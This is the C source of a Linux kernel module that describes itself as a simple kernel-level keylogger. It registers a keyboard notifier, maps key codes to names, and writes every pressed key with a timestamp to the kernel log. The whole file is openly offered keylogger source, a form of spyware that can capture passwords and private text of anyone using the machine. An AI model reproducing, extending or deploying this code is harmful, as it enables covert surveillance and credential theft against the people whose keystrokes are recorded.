#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/init.h>
#include <linux/timekeeping.h>

#define LICENSE "GPL"
#define AUTHOR "1day & isPique"
#define DESCRIPTION "A simple kernel-level keylogger for Linux operating systems"
#define VERSION "0.2"

static const char *keymap[KEY_CNT] = {
    [KEY_ESC] = "ESC",
    [KEY_1] = "1",
    [KEY_2] = "2",
    [KEY_3] = "3",
    [KEY_4] = "4",
    [KEY_5] = "5",
    [KEY_6] = "6",
    [KEY_7] = "7",
    [KEY_8] = "8",
    [KEY_9] = "9",
    [KEY_0] = "0",
    [KEY_MINUS] = "MINUS",
    [KEY_EQUAL] = "EQUAL",
    [KEY_BACKSPACE] = "Backspace",
    [KEY_TAB] = "Tab",
    [KEY_Q] = "Q",
    [KEY_W] = "W",
    [KEY_E] = "E",
    [KEY_R] = "R",
    [KEY_T] = "T",
    [KEY_Y] = "Y",
    [KEY_U] = "U",
    [KEY_I] = "I",
    [KEY_O] = "O",
    [KEY_P] = "P",
    [KEY_LEFTBRACE] = "LEFTBRACE",
    [KEY_RIGHTBRACE] = "RIGHTBRACE",
    [KEY_ENTER] = "ENTER",
    [KEY_LEFTCTRL] = "LEFTCTRL",
    [KEY_A] = "A",
    [KEY_S] = "S",
    [KEY_D] = "D",
    [KEY_F] = "F",
    [KEY_G] = "G",
    [KEY_H] = "H",
    [KEY_J] = "J",
    [KEY_K] = "K",
    [KEY_L] = "L",
    [KEY_SEMICOLON] = "SEMICOLON",
    [KEY_APOSTROPHE] = "APOSTROPHE",
    [KEY_GRAVE] = "GRAVE",
    [KEY_LEFTSHIFT] = "LEFTSHIFT",
    [KEY_BACKSLASH] = "BACKSLASH",
    [KEY_Z] = "Z",
    [KEY_X] = "X",
    [KEY_C] = "C",
    [KEY_V] = "V",
    [KEY_B] = "B",
    [KEY_N] = "N",
    [KEY_M] = "M",
    [KEY_COMMA] = "COMMA",
    [KEY_DOT] = "DOT",
    [KEY_SLASH] = "SLASH",
    [KEY_RIGHTSHIFT] = "RIGHTSHIFT",
    [KEY_LEFTALT] = "LEFTALT",
    [KEY_SPACE] = "SPACE",
    [KEY_CAPSLOCK] = "CAPSLOCK",
    [KEY_F1] = "F1",
    [KEY_F2] = "F2",
    [KEY_F3] = "F3",
    [KEY_F4] = "F4",
    [KEY_F5] = "F5",
    [KEY_F6] = "F6",
    [KEY_F7] = "F7",
    [KEY_F8] = "F8",
    [KEY_F9] = "F9",
    [KEY_F10] = "F10",
    [KEY_NUMLOCK] = "NUMLOCK",
    [KEY_SCROLLLOCK] = "SCROLLLOCK",
    [KEY_KP7] = "KP7",
    [KEY_KP8] = "KP8",
    [KEY_KP9] = "KP9",
    [KEY_KPMINUS] = "KPMINUS",
    [KEY_KP4] = "KP4",
    [KEY_KP5] = "KP5",
    [KEY_KP6] = "KP6",
    [KEY_KPPLUS] = "KPPLUS",
    [KEY_KP1] = "KP1",
    [KEY_KP2] = "KP2",
    [KEY_KP3] = "KP3",
    [KEY_KP0] = "KP0",
    [KEY_KPDOT] = "KPDOT",
    [KEY_F11] = "F11",
    [KEY_F12] = "F12",
    // Add more keys as needed
};

static int last_pressed_key = -1;

static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    struct timespec ts;
    char timestamp[64];

    if (code == KBD_KEYCODE) {
        if (param->value < ARRAY_SIZE(keymap) && keymap[param->value]) {
            if (param->value != last_pressed_key) {
                ktime_get_real_ts(&ts);
                snprintf(timestamp, sizeof(timestamp), "%ld.%09ld", ts.tv_sec, ts.tv_nsec);
                printk(KERN_INFO "[%s] Key pressed: %s\n", timestamp, keymap[param->value]);
                last_pressed_key = param->value;
            }
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notify,
};

static int __init init_keylogger(void) {
    int result;

    result = register_keyboard_notifier(&keylogger_nb);
    if (result) {
        printk(KERN_ERR "Failed to register keyboard notifier\n");
        return result;
    }

    printk(KERN_ALERT "Keylogger loaded into the kernel\n");
    return 0;
}

static void __exit exit_keylogger(void) {
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_ALERT "Keylogger unloaded from the kernel\n");
}

module_init(init_keylogger);
module_exit(exit_keylogger);

MODULE_LICENSE(LICENSE);
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_VERSION(VERSION);
